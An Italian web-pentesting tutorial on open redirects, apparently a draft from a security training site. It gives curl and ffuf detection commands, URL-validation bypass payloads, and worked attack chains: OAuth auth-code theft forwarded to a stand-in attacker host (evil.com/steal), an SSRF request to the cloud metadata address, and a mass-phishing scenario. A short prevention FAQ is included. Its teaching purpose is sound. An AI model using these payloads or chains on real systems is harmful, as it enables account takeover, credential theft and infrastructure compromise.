---
title: 'Open Redirect: Cos’è, Come Sfruttarlo e Chain con OAuth e SSRF'
slug: open-redirect
description: 'Open Redirect nel pentesting web: detection, bypass della validazione URL e chain con OAuth token theft, SSRF bypass e phishing credibile. Guida pratica.'
image: /open-redirect.webp
draft: true
date: 2026-03-17T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - ssrf
---

# Cos'è Un Open Redirect?

Un **Open Redirect** è una vulnerabilità in cui l'applicazione accetta un URL come parametro e reindirizza l'utente a quell'URL senza validazione. L'utente clicca un link che inizia con il dominio legittimo (`https://target.com/redirect?url=https://evil.com`) — sembra sicuro, è il dominio dell'azienda — ma viene portato su `evil.com`.

Da solo sembra basso impatto. In chain diventa devastante: **OAuth token theft** (il `redirect_uri` passa attraverso l'open redirect → il token arriva all'attaccante), **SSRF bypass** (il filtro valida `target.com` → l'open redirect porta la request al metadata cloud), e **phishing perfetto** (il link inizia col dominio aziendale, l'utente si fida).

Satellite della [guida pillar Misc & Infra Attacks](https://hackita.it/articoli/misc-infra-attacks-guida-completa). Vedi anche: [SSRF](https://hackita.it/articoli/ssrf), [OAuth Attack](https://hackita.it/articoli/oauth-attack).

Riferimenti: [PortSwigger Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected), [OWASP Unvalidated Redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html), [HackTricks Open Redirect](https://book.hacktricks.wiki/en/pentesting-web/open-redirect.html).

***

## Detection

### Step 1: Identifica Parametri Di Redirect

```bash
# In Burp Site Map → cerca parametri con queste keyword:
# url, redirect, next, return, redir, dest, destination, out, go,
# continue, return_to, target, link, forward, callback, path, ref, to

# Pattern tipici nel traffico:
/login?next=/dashboard              → cosa succede con next=https://evil.com?
/logout?redirect=/login             → cosa succede con redirect=https://evil.com?
/auth/callback?return_to=/home      → return_to=https://evil.com?
/go?to=https://partner.com          → to=https://evil.com?
/r?url=https://blog.target.com      → url=https://evil.com?
```

### Step 2: Test Redirect Esterno

```bash
# Per ogni parametro trovato:
curl -sI "https://target.com/redirect?url=https://evil.com" | grep -i location
# Location: https://evil.com → OPEN REDIRECT CONFERMATO!

# Testa anche POST:
curl -sI -X POST "https://target.com/login" \
  -d "username=test&password=test&next=https://evil.com" | grep -i location

# JavaScript redirect (non visibile negli header):
curl -s "https://target.com/go?url=https://evil.com" | grep -iE "location\.href|window\.location|redirect"
# Se il body contiene: window.location = "https://evil.com" → redirect client-side!
```

### Step 3: Endpoint Nascosti

```bash
# Endpoint di redirect spesso non linkati nel frontend:
ffuf -u "https://target.com/FUZZ?url=https://evil.com" \
  -w <(echo -e "redirect\nredir\ngo\nout\nforward\nlink\nr\nurl\ncallback\nnext") \
  -mr "Location: https://evil.com" -mc 301,302,303,307,308

# Redirect nel JavaScript (SPA React/Vue/Angular):
# Cerca nel codice sorgente: window.location, location.href, location.replace
# con parametri presi dall'URL (URLSearchParams, queryString)
```

***

## Bypass Validazione

Se l'app valida l'URL di destinazione, i bypass sono molti:

### Regex "Contiene target.com"

```bash
https://evil.com?target.com            # target.com nella query string
https://evil.com#target.com            # target.com nel fragment
https://evil-target.com                # contiene "target.com"
https://target.com.evil.com            # subdomain dell'attaccante
```

### Regex "Inizia Con target.com"

```bash
https://target.com@evil.com            # Username: target.com, Host: evil.com
https://target.com%40evil.com          # @ URL-encoded
https://target.com%2F%2Fevil.com       # //evil.com URL-encoded
https://target.com%00.evil.com         # Null byte
```

### Protocol Tricks

```bash
//evil.com                              # Protocol-relative (segue HTTP/HTTPS del sito)
/\evil.com                             # Backslash (alcuni parser → //evil.com)
/\/evil.com                            # Slash-backslash
///evil.com                            # Triple slash
javascript:alert(1)                    # Se redirect è client-side (location = input)
```

### Encoding

```bash
https://evil%252Ecom                   # Double URL encoding (%25 = %)
https://evil。com                       # Fullwidth dot (Unicode)
https://ⓔⓥⓘⓛ.com                     # Unicode circles
https://evil.com%09                    # Tab
https://evil.com%0d%0a                 # CRLF
```

### Redirect Chain

```bash
# L'app ha DUE endpoint di redirect:
/redirect?url=/go?url=https://evil.com
# Il primo redirect va a /go che redirect fuori
# Il filtro valida solo il primo livello (path relativo → OK) → passa
```

***

## Exploitation — Le Chain

### OAuth Token Theft

```bash
# target.com ha open redirect su /go?url=
# OAuth redirect_uri validato per target.com

https://accounts.google.com/o/oauth2/auth?
  client_id=TARGET_APP_ID
  &redirect_uri=https://target.com/go?url=https://evil.com/steal
  &response_type=code
  &scope=email

# Flusso: Google valida target.com → utente autorizza →
# Google redirect a target.com/go?url=evil.com/steal →
# target.com redirect a evil.com/steal?code=AUTH_CODE →
# → Attaccante ha il code OAuth → scambia per access token
```

### SSRF Bypass

```bash
POST /api/webhook
{"url": "https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/"}

# Il filtro SSRF accetta target.com → il server fetcha →
# target.com redirect 302 → il server segue → metadata cloud!
```

### Phishing (Massimo Volume)

```bash
# Email a 5.000 dipendenti:
# "Aggiorna la password del tuo account aziendale"
# https://target.com/go?url=https://evil.com/login
# Il link inizia con il dominio aziendale → fiducia → credenziali catturate
```

***

## Output Reale

```bash
$ curl -sI "https://target.com/auth/logout?return_to=https://evil.com" | grep Location
Location: https://evil.com
# → Open Redirect sul logout

$ # Con bypass (il filtro controlla prefisso "https://target.com"):
$ curl -sI "https://target.com/go?url=https://target.com@evil.com" | grep Location
Location: https://target.com@evil.com
# → Bypass! Il browser interpreta evil.com come host

$ # OAuth chain:
$ curl -sI "https://target.com/auth/callback?return_to=https://evil.com/steal&code=AUTH_CODE"
Location: https://evil.com/steal?code=AUTH_CODE
# → Auth code inoltrato all'attaccante!
```

***

## Workflow Operativo

**Step 1** → Cerca parametri redirect in Burp (url, next, return, redirect, dest, go, callback)

**Step 2** → Testa redirect a `https://evil.com`

**Step 3** → Se validato → testa bypass (@, encoding, protocol-relative, chain, Unicode)

**Step 4** → Valuta chain: OAuth token theft? SSRF bypass? Phishing?

**Step 5** → Documenta la chain completa con impatto — non solo "c'è un redirect"

***

## Caso Studio

**Settore:** SaaS con "Accedi con Google", 30.000 utenti.

L'endpoint `/auth/callback?return_to=` accettava qualsiasi URL. Il `redirect_uri` OAuth era validato come `https://app.target.com/*`. Chain: URL OAuth con `redirect_uri=https://app.target.com/auth/callback?return_to=https://evil.com/steal` → l'utente autorizza → Google redirect al callback → il callback redirect a evil.com con il code.

**Un parametro `return_to` non validato → OAuth token theft → account takeover.**

***

## FAQ

### L'Open Redirect da solo è una vulnerabilità?

Sì, ma a basso impatto. La maggior parte dei programmi bug bounty lo classifica come "Informational" o "Low" se presentato da solo. Diventa Medium/High/Critical quando lo chaini: OAuth token theft, SSRF bypass, phishing credibile. Nel report, presenta sempre la **chain completa**.

### Come previeni l'Open Redirect?

Whitelist di URL di destinazione ammessi. Se non possibile, valida che l'URL inizi con `/` (path relativo, non URL esterno). Non fidarti di regex su URL — i bypass sono troppi. Non accettare URL completi come parametro se puoi evitarlo.

### Il redirect JavaScript è vulnerabile come quello server-side?

Sì, se il parametro finisce in `window.location` o `location.href` senza validazione. In più, se il parametro finisce in `javascript:` → diventa una XSS. Il redirect server-side (header `Location`) non permette `javascript:`, quello client-side sì.

### Qual è la differenza tra Open Redirect e SSRF?

L'Open Redirect reindirizza il **browser dell'utente** → impatto su utente (phishing, token theft). La SSRF fa fare una request al **server** → impatto sull'infrastruttura (metadata, rete interna). Ma l'open redirect può **essere usato come componente** di una SSRF: il filtro SSRF accetta target.com → l'open redirect porta la request dove vuole l'attaccante.

***

## ✅ Checklist

```
DISCOVERY
☐ Parametri redirect identificati (url, next, return, dest, go, callback)
☐ Redirect a https://evil.com testato (header + JS)
☐ Endpoint nascosti fuzzati (ffuf)
☐ Redirect POST testato (next/return nel body del login)

BYPASS
☐ https://target.com@evil.com
☐ //evil.com (protocol-relative)
☐ Encoding (%2F, %40, double encoding, Unicode)
☐ target.com.evil.com / evil-target.com
☐ evil.com?target.com / evil.com#target.com
☐ Null byte (%00)
☐ Redirect chain (/redirect→/go→evil.com)
☐ javascript: (se redirect client-side)

CHAIN
☐ OAuth: redirect_uri via open redirect → token theft?
☐ SSRF: webhook via open redirect → metadata?
☐ Phishing: link legittimo → pagina fake?
```

***

> I tuoi parametri di redirect validano l'URL? L'open redirect è chainabile con OAuth? [Penetration test HackIta](https://hackita.it/servizi). Dal redirect al token theft: [formazione 1:1](https://hackita.it/formazione).
